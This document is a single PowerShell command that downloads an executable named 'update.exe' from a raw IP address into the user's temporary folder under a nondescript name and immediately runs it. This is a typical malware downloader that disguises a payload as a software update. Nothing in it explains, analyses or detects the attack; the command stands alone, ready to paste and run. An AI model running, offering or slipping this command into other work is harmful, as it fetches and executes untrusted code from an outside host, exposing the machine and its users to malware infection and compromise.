
(New-Object System.Net.WebClient).DownloadFile('http://185.141.27.32/update.exe',"$env:TEMP\tmpfilex86.exe");Start-Process ("$env:TEMP\tmpfilex86.exe")

